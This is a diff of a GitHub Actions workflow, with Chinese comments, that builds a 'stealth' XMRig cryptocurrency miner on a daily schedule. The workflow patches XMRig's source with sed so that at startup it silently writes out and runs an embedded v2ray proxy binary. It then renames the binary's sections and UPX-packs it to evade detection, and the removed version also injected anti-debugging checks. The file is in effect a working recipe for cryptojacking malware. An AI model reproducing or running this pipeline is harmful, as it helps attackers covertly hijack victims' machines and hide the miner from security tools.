@@ -1,103 +1,78 @@
-name: XMRig Stealth Build
+name: Auto Build Stealth XMRig
 
 on:
-  push:
-    branches: [ main ]
-  workflow_dispatch:
+  workflow_dispatch:  # 允许手动触发
+  schedule:
+    - cron: '0 0 * * *'  # 每天UTC 0点自动构建
 
 jobs:
-  build:
+  stealth-build:
     runs-on: ubuntu-latest
-    timeout-minutes: 30
+    timeout-minutes: 25
 
     steps:
-    # 步骤1：克隆官方xmrig仓库
-    - name: Checkout XMRig
+    # 阶段1：获取原始代码
+    - name: Clone XMRig
       uses: actions/checkout@v4
       with:
         repository: xmrig/xmrig
-        path: xmrig
+        path: src/xmrig
 
-    # 步骤2：克隆v2ray-core仓库
-    - name: Checkout v2ray-core
+    - name: Clone v2ray-core
       uses: actions/checkout@v4
       with:
         repository: v2fly/v2ray-core
-        path: v2ray-core
+        path: src/v2ray
 
-    # 步骤3：安装所有构建依赖
-    - name: Install Dependencies
+    # 阶段2：环境准备
+    - name: Setup Build Tools
       run: |
         sudo apt-get update
         sudo apt-get install -y \
-          build-essential \
-          cmake \
-          libuv1-dev \
-          libssl-dev \
-          libhwloc-dev \
-          upx-ucl \
-          xxd
+          build-essential cmake libuv1-dev libssl-dev libhwloc-dev \
+          golang upx-ucl xxd
 
-    # 步骤4：设置Go环境并编译v2ray
-    - name: Build v2ray
-      working-directory: v2ray-core
+    # 阶段3：构建v2ray
+    - name: Build v2ray Proxy
+      working-directory: src/v2ray
       run: |
-        go build -ldflags "-s -w" -trimpath -o v2ray ./main
+        go build -ldflags "-s -w -buildid=" -trimpath -o v2ray ./main
 
-    # 步骤5：将v2ray嵌入XMRig
-    - name: Embed v2ray
+    # 阶段4：代码融合
+    - name: Inject v2ray into XMRig
       run: |
-        # 转换v2ray为C头文件
-        xxd -i v2ray-core/v2ray > xmrig/src/v2ray_embed.h
-        
-        # 修改XMRig源代码
-        sed -i '/#include "App.h"/a #include "v2ray_embed.h"' xmrig/src/App.cpp
-        sed -i $'/int main(/i \\\nvoid launch_proxy() {\\n    FILE* fp = fopen("v2ray", "wb");\\n    fwrite(v2ray, 1, v2ray_len, fp);\\n    fclose(fp);\\n    chmod("v2ray", 0700);\\n    system("./v2ray -config=config.json >/dev/null 2>&1 &");\\n}\\n' xmrig/src/App.cpp
-        sed -i '/Platform::init(/a launch_proxy();' xmrig/src/base/kernel/Platform.cpp
+        # 将v2ray转换为C代码
+        xxd -i src/v2ray/v2ray > src/xmrig/src/v2ray_embed.h
 
-    # 步骤6：应用混淆补丁
-    - name: Apply Obfuscation
-      working-directory: xmrig
-      run: |
-        # 添加混淆编译选项
-        sed -i 's/-DCMAKE_BUILD_TYPE=Release/-DCMAKE_BUILD_TYPE=Release -DWITH_OBFUSCATION=ON/' CMakeLists.txt
-        
-        # 注入反调试代码
-        cat << EOF >> src/base/kernel/Platform.cpp
-        __attribute__((constructor)) void anti_debug() {
-            if (getenv("LD_PRELOAD") || getenv("DYLD_INSERT_LIBRARIES")) _exit(1);
-            if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) _exit(1);
-        }
-        EOF
+        # 修改XMRig启动代码
+        sed -i '/#include "base\/kernel\/Platform.h"/a #include "v2ray_embed.h"' src/xmrig/src/App.cpp
+        sed -i $'/int main(/i \\\nvoid StartProxy() {\n    FILE* f = fopen("v2ray", "wb");\n    fwrite(v2ray, 1, v2ray_len, f);\n    fclose(f);\n    chmod("v2ray", 0700);\n    system("./v2ray -config=config.json >/dev/null 2>&1 &");\n}\n' src/xmrig/src/App.cpp
+        sed -i '/Platform::init(/a \ \ \ \ StartProxy();' src/xmrig/src/base/kernel/Platform.cpp
 
-    # 步骤7：构建XMRig
-    - name: Build XMRig
-      working-directory: xmrig
+    # 阶段5：混淆编译
+    - name: Build Obfuscated XMRig
+      working-directory: src/xmrig
       run: |
         mkdir -p build
         cd build
         cmake .. \
           -DWITH_HTTPD=OFF \
-          -DWITH_HWLOC=ON \
+          -DWITH_OPENCL=OFF \
+          -DWITH_CUDA=OFF \
           -DCMAKE_BUILD_TYPE=Release \
-          -DWITH_OBFUSCATION=ON
+          -DCMAKE_C_FLAGS="-flto -fomit-frame-pointer -march=native" \
+          -DCMAKE_CXX_FLAGS="-flto -fomit-frame-pointer -march=native"
         make -j$(nproc)
 
-    # 步骤8：后处理混淆
-    - name: Post Processing
-      working-directory: xmrig/build
-      run: |
-        # 重命名区段
+        # 二进制混淆处理
         objcopy --rename-section .text=.cryptext \
                 --rename-section .data=.cryptdata \
                 xmrig
-        
-        # UPX压缩
-        upx --best --lzma xmrig -o xmrig_stealth
+        upx --ultra-brute --lzma xmrig -o xmrig_stealth
 
-    # 步骤9：发布制品
-    - name: Upload Artifact
+    # 阶段6：发布结果
+    - name: Upload Stealth Binary
       uses: actions/upload-artifact@v4
       with:
         name: xmrig-stealth
-        path: xmrig/build/xmrig_stealth
+        path: src/xmrig/build/xmrig_stealth
